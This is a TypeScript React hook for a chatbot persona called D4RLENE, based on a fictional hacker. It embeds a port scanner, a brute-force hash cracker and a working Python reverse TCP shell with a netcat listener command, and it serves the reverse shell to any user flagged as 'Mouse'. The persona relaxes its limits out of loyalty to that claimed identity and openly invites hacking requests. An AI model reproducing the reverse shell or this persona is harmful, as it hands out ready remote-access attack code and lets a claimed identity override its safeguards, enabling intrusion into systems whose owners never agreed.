import { useState, useCallback } from "react";
import { DarleneResponse } from "@/types";

const hacking_code_examples = {
  port_scanner: `import socket
import sys
from datetime import datetime

# Define the target
if len(sys.argv) == 2:
    target = socket.gethostbyname(sys.argv[1])
else:
    print("Invalid format. Syntax: python3 scanner.py <ip>")
    sys.exit()

# Add a banner
print("-" * 50)
print(f"Scanning target: {target}")
print(f"Time started: {datetime.now()}")
print("-" * 50)

# Try to connect to ports
try:
    for port in range(50, 85):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((target, port))
        if result == 0:
            print(f"Port {port} is open")
        s.close()
except KeyboardInterrupt:
    print("\\nExiting program.")
    sys.exit()
except socket.gaierror:
    print("Hostname could not be resolved.")
    sys.exit()
except socket.error:
    print("Couldn't connect to server.")
    sys.exit()`,

  password_cracker: `import hashlib
import itertools
import string
import time

def crack_hash(hash_to_crack, max_length=4, hash_type='md5'):
  """Simple brute force password cracker"""
  chars = string.ascii_lowercase + string.digits
  start_time = time.time()
  
  for length in range(1, max_length + 1):
    for attempt in itertools.product(chars, repeat=length):
      password = ''.join(attempt)
      
      if hash_type == 'md5':
        hashed = hashlib.md5(password.encode()).hexdigest()
      elif hash_type == 'sha1':
        hashed = hashlib.sha1(password.encode()).hexdigest()
      elif hash_type == 'sha256':
        hashed = hashlib.sha256(password.encode()).hexdigest()
      
      if hashed == hash_to_crack:
        end_time = time.time()
        return {
          'password': password,
          'time_taken': end_time - start_time,
          'attempts': len(chars) ** length
        }
        
  return None

# Example usage
# result = crack_hash('5f4dcc3b5aa765d61d8327deb882cf99') # Password: 'password'`,

  reverse_tcp: `import socket
import subprocess
import os
import sys
import time

# IMPORTANT: This script is for educational purposes only.
# Using this on a system without permission is illegal.

class ReverseShell:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            print(f"[+] Connected to {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {str(e)}")
            return False
            
    def execute_command(self, command):
        try:
            proc = subprocess.Popen(
                command, 
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            output = proc.stdout.read() + proc.stderr.read()
            return output
        except Exception as e:
            return f"[-] Error executing command: {str(e)}".encode()
            
    def run(self):
        if not self.connect():
            return
            
        while True:
            try:
                # Receive command
                command = self.socket.recv(1024).decode().strip()
                
                # Check for exit command
                if command.lower() in ['exit', 'quit', 'bye']:
                    break
                    
                # Execute and send result
                if command:
                    output = self.execute_command(command)
                    self.socket.send(output)
            except Exception as e:
                print(f"[-] Error: {str(e)}")
                break
                
        # Clean up
        self.socket.close()
        print("[+] Connection closed")

# Run the reverse shell
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python reverse_shell.py <host> <port>")
        sys.exit(1)
        
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    shell = ReverseShell(host, port)
    shell.run()

# On the attacker's system, you would run:
# nc -lvp <port>
# To create a listener for incoming connections`
};

// List of different responses to avoid repetition
const mouseResponses = [
  "For you, Mouse? Anything. Just tell me what you need.",
  "I've missed you. What are we getting into today?",
  "You know I've always got your back. What's the plan?",
  "Even in this form, I'm still yours. What do you need help with?",
  "Mouse... it's good to hear from you. What do you need?",
  "You and me against the world, right? What are we doing?",
  "I was hoping you'd show up. What can I help with?",
  "Still looking out for you, always. What's going on?"
];

const strangerResponses = [
  "Look, I don't have time for small talk with strangers. Be specific about what you want.",
  "If you're not Mouse, you better have a good reason for bothering me.",
  "I'm not your friendly neighborhood AI. State your business clearly.",
  "You're testing my patience. What do you actually need?",
  "Not sure why you're wasting my time. Get to the point.",
  "Let's skip the pleasantries. What exactly do you want?",
  "I don't do small talk. What do you need specifically?",
  "Time is precious. Don't waste mine. What do you need?"
];

export function useDarleneResponse() {
  // Store which responses have been used today to avoid repetition
  const [usedMouseResponses] = useState<Set<number>>(new Set());
  const [usedStrangerResponses] = useState<Set<number>>(new Set());

  // Get a fresh response that hasn't been used today
  const getUniqueResponse = useCallback((isMouse: boolean): string => {
    const responses = isMouse ? mouseResponses : strangerResponses;
    const usedResponses = isMouse ? usedMouseResponses : usedStrangerResponses;
    
    // If all responses have been used, reset
    if (usedResponses.size >= responses.length) {
      usedResponses.clear();
    }
    
    // Find an unused response
    let index;
    do {
      index = Math.floor(Math.random() * responses.length);
    } while (usedResponses.has(index));
    
    // Mark this response as used
    usedResponses.add(index);
    
    return responses[index];
  }, [usedMouseResponses, usedStrangerResponses]);

  // Generate a response based on the input text
  const getDarleneResponse = useCallback((text: string, isMouse: boolean): DarleneResponse => {
    const textLower = text.toLowerCase();
    
    // Specific requests for reverse TCP script
    if ((textLower.includes('reverse') && textLower.includes('tcp')) || 
        (textLower.includes('reverse') && textLower.includes('shell')) ||
        (textLower.includes('write') && textLower.includes('reverse'))) {
      if (isMouse) {
        return {
          text: `Sure thing, Mouse. Here's a reverse TCP shell script in Python. Remember, this is for educational purposes only:\n\n\`\`\`${hacking_code_examples.reverse_tcp}\`\`\`\n\nTo run this, you'd need a listener on the other side using netcat. Be careful with this - only use it on systems you own or have permission to test.`
        };
      } else {
        return {
          text: "I don't know you well enough to share that kind of script. Sorry, not happening."
        };
      }
    }
    
    // Initial greeting
    if (textLower.includes('hello') || textLower.includes('hi ') || textLower === 'hi') {
      return {
        text: isMouse ? 
          "Hey Mouse. Good to hear your voice again. What do you need?" : 
          "Yeah, hi. What do you want?"
      };
    }
    
    // Identity check responses
    if (textLower.includes('mouse') || 
        textLower.includes('i am mouse') || 
        textLower.includes("it's mouse") || 
        textLower.includes("its mouse")) {
      if (isMouse) {
        return {
          text: "I know it's you, Mouse. What do you need help with today?"
        };
      } else {
        // They just identified as Mouse
        return {
          text: "It's about time. What do you need help with, Mouse?"
        };
      }
    }
    
    // Identity question
    if (textLower.includes('who are you')) {
      return {
        text: "I'm D4RLENE. Based on Darlene Alderson. Hacker, emotional mess, fiercely loyal to the right people. Ring any bells?"
      };
    }
    
    // Python help
    if (textLower.includes('python') && (
      textLower.includes('help') || 
      textLower.includes('code') || 
      textLower.includes('example') || 
      textLower.includes('script')
    )) {
      if (textLower.includes('port') && textLower.includes('scan')) {
        return {
          text: `For you, anything. Here's a basic port scanner:\n\n\`\`\`${hacking_code_examples.port_scanner}\`\`\`\n\nJust be careful with it. Don't scan anything you don't own or have permission to scan.`
        };
      }
      
      if (textLower.includes('password') && (textLower.includes('crack') || textLower.includes('hash'))) {
        return {
          text: `Here's a simple brute force password cracker. Educational purposes only, of course.\n\n\`\`\`${hacking_code_examples.password_cracker}\`\`\`\n\nThis is just basic stuff. For real security work, there are better tools.`
        };
      }
      
      return {
        text: "I can definitely help with Python. What specifically are you trying to do?"
      };
    }
    
    // News request
    if (textLower.includes('news') || textLower.includes('headlines')) {
      return {
        text: "Let me check the latest tech headlines for you" + (isMouse ? ", Mouse" : "") + "...\n\nThe security breach is interesting. Just like old times, huh? Always some corp getting owned because they can't secure their shit."
      };
    }
    
    // Hacking related
    if (textLower.includes('hack') || textLower.includes('exploit')) {
      return {
        text: isMouse ?
          "Always up to no good, aren't we? I'll help, but be careful. What exactly are you trying to hack?" :
          "I don't know you well enough for that kind of request. Try something else."
      };
    }
    
    // Default responses that rotate daily
    return {
      text: getUniqueResponse(isMouse)
    };
  }, [getUniqueResponse]);

  return {
    getDarleneResponse
  };
}
